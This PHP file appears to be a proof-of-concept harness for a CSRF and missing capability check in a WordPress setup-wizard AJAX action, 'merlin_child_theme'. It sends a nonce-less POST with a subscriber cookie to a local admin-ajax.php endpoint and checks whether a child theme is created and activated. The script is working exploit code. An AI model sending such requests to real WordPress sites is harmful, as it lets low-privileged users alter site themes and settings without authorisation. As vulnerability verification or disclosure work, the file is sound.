<?php
/*
 PoC for MerlinWP wp_ajax_merlin_child_theme CSRF + missing capability check.
 Run manually:
   docker build -t poc-0803 .
   docker run --rm poc-0803
 Expected: tokenless POST action=merlin_child_theme with only a logged-in cookie
 creates a child theme and changes options.
*/
function rrmdir($dir) {
    if (!is_dir($dir)) { return; }
    foreach (array_diff(scandir($dir), ['.', '..']) as $file) {
        $path = "$dir/$file";
        is_dir($path) ? rrmdir($path) : unlink($path);
    }
    rmdir($dir);
}
function http_request($method, $url, $headers = [], $body = '') {
    $opts = ['http' => [
        'method' => $method,
        'header' => implode("\r\n", $headers),
        'content' => $body,
        'ignore_errors' => true,
    ]];
    $response = file_get_contents($url, false, stream_context_create($opts));
    return [$response, $http_response_header ?? []];
}

rrmdir(__DIR__ . '/themes/demo-theme-child');
@mkdir(__DIR__ . '/themes', 0777, true);
file_put_contents(__DIR__ . '/options.json', json_encode(['allowedthemes' => [], 'active_theme' => 'demo-theme'], JSON_PRETTY_PRINT));

$payload = http_build_query([
    'action' => 'merlin_child_theme',
    // Intentionally no wpnonce and no capability marker.
]);
[$response, $headers] = http_request('POST', 'http://127.0.0.1:8000/wp-admin/admin-ajax.php', [
    'Cookie: wordpress_logged_in=subscriber-session',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: ' . strlen($payload),
], $payload);

$options = json_decode(file_get_contents(__DIR__ . '/options.json'), true) ?: [];
$style = __DIR__ . '/themes/demo-theme-child/style.css';
$functions = __DIR__ . '/themes/demo-theme-child/functions.php';
$passed = file_exists($style)
    && file_exists($functions)
    && (($options['allowedthemes']['demo-theme-child'] ?? false) === true)
    && (($options['active_theme'] ?? '') === 'demo-theme-child')
    && (($options['received_wpnonce'] ?? true) === false)
    && (($options['received_capability_marker'] ?? true) === false);

echo "HTTP response: $response\n";
echo "Options after request:\n" . json_encode($options, JSON_PRETTY_PRINT) . "\n";
echo "Generated files:\n$style\n$functions\n";
if (!$passed) {
    fwrite(STDERR, "[FAIL] Tokenless AJAX request did not generate child theme state.\n");
    exit(1);
}
echo "[PASS] Logged-in tokenless AJAX request generated and activated a child theme without nonce/capability checks.\n";
